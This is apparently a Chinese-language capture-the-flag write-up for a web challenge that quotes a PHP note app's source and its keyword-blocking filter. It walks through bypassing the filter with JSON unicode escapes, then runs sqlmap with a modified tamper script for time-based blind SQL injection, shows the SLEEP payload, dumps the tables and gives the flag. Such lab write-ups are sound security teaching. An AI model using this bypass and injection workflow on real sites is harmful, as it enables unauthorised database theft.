# wafwaf

My classmate Jason made this small and super secure note taking application, check it out!

### Solution
* 這一題是 code review
    ```php=
    <?php error_reporting(0);
    require 'config.php';

    class db extends Connection {
        public function waf($s) {
            if (preg_match_all('/'. implode('|', array(
                '[' . preg_quote("(*<=>|'&-@") . ']',
                'select', 'and', 'or', 'if', 'by', 'from', 
                'where', 'as', 'is', 'in', 'not', 'having'
            )) . '/i', $s, $matches)) die(var_dump($matches[0]));
            return json_decode($s);
        }

        public function query($sql) {
            $args = func_get_args();
            unset($args[0]);
            return parent::query(vsprintf($sql, $args));
        }
    }

    $db = new db();

    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $obj = $db->waf(file_get_contents('php://input'));
        $db->query("SELECT note FROM notes WHERE assignee = '%s'", $obj->user);
    } else {
        die(highlight_file(__FILE__, 1));
    }
    ?>
    ```
* 流程滿清楚的，用 `post`，資料會用 `php://input` 拿到，要傳 json，格式是 `{"user":"some_thing"}`，傳的資料會先被 waf 經過 `json_decode`，之後再放進去 qurey 裡面
* 直接看 query 的語法，滿明顯的有 sql injection 的問題，有一個更大的問題是只能用 time based 的方法拿到資料，因為就算傳輸的資料是正確的，也拿不到回傳資料

#### json_decode
* https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/
* 參考完這一篇可以知道可以透過編碼繞過 waf
* 例如說 `a -> \u0061`

#### sql injection
* 因為我懶得寫 script（有空的話會寫拉），所以我用 sqlmap 自帶的 tamper 來攻擊
* https://xz.aliyun.com/t/2746
* 在這裡我用的是 `charunicodeencode.py`，可以參考一下他的輸出
    ```bash=
    使用脚本前：tamper('SELECT FIELD%20FROM TABLE')
    使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045
    ```
* 所以說只要稍微的改動一下腳本的內容就可以用拉
* 我把最後的回傳改一下 `return retVal.replace('%u0020', ' ').replace('%', '\\')`，就可以用拉
* 因為很明顯是 time based，所以直接指定會比較不花時間
    ```bash=
    sqlmap -r post --tamper charunicodeencode.py --technique=T --batch
    ```
    ```bash=
    ---
    Parameter: JSON user ((custom) POST)
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: {"user":"123' AND (SELECT 8608 FROM (SELECT(SLEEP(5)))BQbD) AND 'ofJD'='ofJD"}
    ---
    ```
* 之後看一下他的 database
    ```bash=
    sqlmap -r post --tamper charunicodeencode.py --technique=T --dbs --batch
    ```
    ```bash=
    available databases [5]:
    [*] db_m8452
    [*] information_schema
    [*] mysql
    [*] performance_schema
    [*] sys
    ```
* 滿明顯就是 `sb_m8452`，所以指定他看一下 table 拉
    ```bash=
    sqlmap -r post --tamper charunicodeencode.py --technique=T -D db_m8452 --tables --batch
    ```
    ```bash=
    Database: db_m8452
    [2 tables]
    +-----------------------+
    | definitely_not_a_flag |
    | notes                 |
    +-----------------------+
    ```
    > 所以那個 `definitely_not_a_flag` 是在 XDDDD
* 他說沒有 flag 當然要 dump 出來看一下拉
    ```bash=
    sqlmap -r post --tamper charunicodeencode.py --technique=T -D db_m8452 --dump --batch
    ```
    ```bash=
    Database: db_m8452
    Table: notes
    [1 entry]
    +----+--------+----------+
    | id | note   | assignee |
    +----+--------+----------+
    | 1  | wafwaf | admin    |
    +----+--------+----------+
    
    Database: db_m8452
    Table: definitely_not_a_flag
    [1 entry]
    +-----------------------------------+
    | flag                              |
    +-----------------------------------+
    | HTB{w4f_w4fing_my_w4y_0utt4_h3r3} |
    +-----------------------------------+
    ```

#### result
* `json_decode` 的編碼問題真的讓我學到一課呢
* tamper 讚讚
* 我有空的時候一定會寫 script 的
* flag : `HTB{w4f_w4fing_my_w4y_0utt4_h3r3}`
